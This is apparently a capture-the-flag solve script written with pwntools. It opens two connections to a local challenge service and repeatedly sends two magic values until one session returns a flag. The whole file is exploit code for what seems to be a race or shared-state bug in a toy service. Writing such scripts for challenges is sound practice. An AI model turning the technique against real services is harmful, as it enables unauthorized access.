from pwn import * 

p1 = remote('localhost', 1337)
p2 = remote('localhost', 1337)


#p1.sendline(b"\xde\xc0\x37\x13\x00\x00\x00\x00")
while True:
	p1.sendline(p64(0x1337c0de))
	p2.sendline(p64(0xdeadc0de))
	p1.recvline() #you are in
	flag = p1.recvline() #maybe 	flag maybe nope
	p2.recvline() #nope

	if b'flag' in flag:
		print(flag)
		break



p1.close()
p2.close()
